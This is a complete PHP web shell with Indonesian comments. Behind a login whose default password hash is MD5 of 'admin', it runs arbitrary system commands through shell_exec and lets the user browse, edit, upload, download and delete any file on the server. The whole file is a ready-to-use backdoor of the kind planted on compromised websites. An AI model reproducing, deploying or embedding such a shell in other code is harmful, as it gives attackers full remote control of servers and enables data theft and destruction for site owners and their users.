<?php
session_start();

// ============================================
// KONFIGURASI PASSWORD (MD5)
// Ganti hash di bawah dengan MD5 password kamu
// Contoh: md5("rahasia123") = 3b5d0a1e...
// ============================================
$PASSWORD_MD5 = "21232f297a57a5a743894a0e4a801fc3"; // default: "admin"

// Proses logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

// Proses login
$login_error = '';
if(isset($_POST['password'])){
    if(md5($_POST['password']) === $PASSWORD_MD5){
        $_SESSION['logged_in'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Password salah!';
    }
}

// Kalau belum login, tampilkan form login saja
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
?>
<!DOCTYPE html>
<html>
<head><title>Login</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.login-box{background:#111;border:1px solid #0f0;padding:30px;text-align:center;}
.login-box h2{margin-top:0;}
.login-box input{background:#000;color:#0f0;border:1px solid #333;padding:8px;width:200px;margin:5px 0;}
.login-box button{background:#333;color:#0f0;border:1px solid #0f0;padding:8px 20px;cursor:pointer;}
.err{color:#f00;margin-bottom:10px;}
</style>
</head>
<body>
<div class="login-box">
<h2>[ Login ]</h2>
<?php if($login_error): ?><div class="err"><?=htmlspecialchars($login_error)?></div><?php endif; ?>
<form method="post">
<input type="password" name="password" placeholder="Password..." autofocus required><br>
<button type="submit">Masuk</button>
</form>
</div>
</body>
</html>
<?php
    exit;
}

// ============================================
// DI BAWAH INI KODE SHELL ASLI KAMU
// ============================================
$shell_dir = dirname(__FILE__);
$dir = isset($_GET['dir']) ? $_GET['dir'] : $shell_dir;
if(!is_dir($dir)) $dir = $shell_dir;
chdir($dir);

// JALANKAN COMMAND
if(isset($_POST['cmd']) && $_POST['cmd'] != ''){
    $cmd = $_POST['cmd'];
    if(preg_match('/^\s*cd\s+(.+)/', $cmd, $match)){
        $new = trim($match[1]);
        if($new == '..') $dir = dirname($dir);
        elseif($new[0] == '/') $dir = $new;
        else $dir = realpath($dir.'/'.$new) ?: $dir;
        chdir($dir);
        header("Location: ?dir=".urlencode($dir));
        exit;
    }else{
        $out = shell_exec($cmd.' 2>&1');
    }
}

// HAPUS FILE
if(isset($_GET['del'])){
    $file = $dir.'/'.$_GET['del'];
    if(file_exists($file)){
        if(is_dir($file)){
            @rmdir($file);
        }else{
            @unlink($file);
        }
    }
}

// DOWNLOAD FILE
if(isset($_GET['down'])){
    $file = $dir.'/'.$_GET['down'];
    if(is_file($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// EDIT FILE
$edit_mode = false;
if(isset($_GET['edit'])){
    $edit_file = $dir.'/'.$_GET['edit'];
    if(is_file($edit_file)){
        $edit_mode = true;
        $edit_content = file_get_contents($edit_file);
    }
}
if(isset($_POST['save']) && isset($_POST['fname']) && isset($_POST['content'])){
    file_put_contents($dir.'/'.$_POST['fname'], $_POST['content']);
}

// UPLOAD FILE
if(isset($_FILES['upfile']['tmp_name'])){
    move_uploaded_file($_FILES['upfile']['tmp_name'], $dir.'/'.$_FILES['upfile']['name']);
}

// CREATE FOLDER
if(isset($_POST['newfolder']) && $_POST['newfolder'] != ''){
    $foldername = trim($_POST['newfolder']);
    @mkdir($dir.'/'.$foldername, 0755, true);
}

// CREATE FILE
if(isset($_POST['newfile']) && $_POST['newfile'] != ''){
    $filename = trim($_POST['newfile']);
    @file_put_contents($dir.'/'.$filename, '');
}
?>
<!DOCTYPE html>
<html>
<head><title>Shell</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;margin:0;padding:10px;font-size:14px;}
a{color:#0ff;}
.path{background:#111;padding:8px;margin-bottom:10px;}
table{border-collapse:collapse;width:100%;}
td,th{padding:5px;border:1px solid #333;}
th{background:#222;}
tr:hover{background:#111;}
.cmd{background:#111;padding:8px;margin-top:15px;border-top:1px solid #333;}
.cmd input{width:80%;background:#000;color:#0f0;border:1px solid #333;padding:5px;}
.cmd button{background:#333;color:#0f0;border:1px solid #0f0;padding:5px 10px;}
.out{background:#000;color:#0f0;padding:8px;margin-top:5px;border:1px solid #333;max-height:200px;overflow:auto;}
textarea{width:100%;height:400px;background:#000;color:#0f0;border:1px solid #0f0;}
.create-form{margin:10px 0;background:#111;padding:10px;}
.create-form input{margin:5px;background:#000;color:#0f0;border:1px solid #333;padding:5px;}
.logout{float:right;color:#f00;text-decoration:none;}
</style>
</head>
<body>

<!-- PATH -->
<div class="path">
<a href="?logout=1" class="logout" onclick="return confirm('Logout?')">[ Logout ]</a>
<?php
$path_parts = explode('/', trim($dir, '/'));
$current_path = '';
echo '<a href="?dir=/">/</a>';
foreach($path_parts as $part){
    if($part == '') continue;
    $current_path .= '/' . $part;
    echo ' <a href="?dir='.urlencode($current_path).'">'.$part.'</a>/';
}
?>
</div>

<?php if(isset($out)): ?>
<div class="out">
<strong>Output:</strong><br>
<?=htmlspecialchars($out)?>
</div>
<?php endif; ?>

<!-- CREATE FOLDER & FILE -->
<div class="create-form">
<form method="post" style="display:inline;">
<input type="text" name="newfolder" placeholder="New folder name" size="20">
<button type="submit">Create Folder</button>
</form>
<form method="post" style="display:inline;margin-left:10px;">
<input type="text" name="newfile" placeholder="New file name" size="20">
<button type="submit">Create File</button>
</form>
<form method="post" enctype="multipart/form-data" style="display:inline;margin-left:10px;">
<input type="file" name="upfile">
<button type="submit">Upload File</button>
</form>
</div>

<?php if($edit_mode): ?>
<h3>Edit: <?=$_GET['edit']?></h3>
<form method="post">
<input type="hidden" name="fname" value="<?=htmlspecialchars($_GET['edit'])?>">
<textarea name="content"><?=htmlspecialchars($edit_content)?></textarea><br>
<button name="save">Save</button>
<a href="?dir=<?=urlencode($dir)?>">Cancel</a>
</form>

<?php else: ?>

<table>
<tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr>
<?php
if($dir != '/'){
    $parent = dirname($dir);
    echo '<tr><td><a href="?dir='.urlencode($parent).'">../</a></td><td>-</td><td>-</td><td>-</td></tr>';
}

$files = scandir($dir);
foreach($files as $f){
    if($f == '.' || $f == '..') continue;
    $full = $dir.'/'.$f;
    $is_dir = is_dir($full);
    $size = $is_dir ? '-' : number_format(filesize($full)).' B';
    $perm = substr(sprintf('%o',fileperms($full)),-4);
    
    echo '<tr>';
    echo '<td>';
    if($is_dir){
        echo '<a href="?dir='.urlencode($full).'">'.$f.'/</a>';
    }else{
        echo $f;
    }
    echo '</td>';
    echo '<td>'.$size.'</td>';
    echo '<td>'.$perm.'</td>';
    echo '<td>';
    if($is_dir){
        echo '[<a href="?dir='.urlencode($full).'">Open</a>] ';
        echo '[<a href="?dir='.urlencode($dir).'&del='.urlencode($f).'" onclick="return confirm(\'Delete folder '.$f.'?\')">Del</a>]';
    }else{
        echo '[<a href="?dir='.urlencode($dir).'&edit='.urlencode($f).'">Edit</a>] ';
        echo '[<a href="?dir='.urlencode($dir).'&down='.urlencode($f).'">Down</a>] ';
        echo '[<a href="?dir='.urlencode($dir).'&del='.urlencode($f).'" onclick="return confirm(\'Delete file '.$f.'?\')">Del</a>]';
    }
    echo '</td>';
    echo '</tr>';
}
?>
</table>

<div class="cmd">
<form method="post">
<input type="text" name="cmd" placeholder="Command..." autofocus>
<button type="submit">>></button>
</form>
</div>

<?php endif; ?>
</body>
</html>
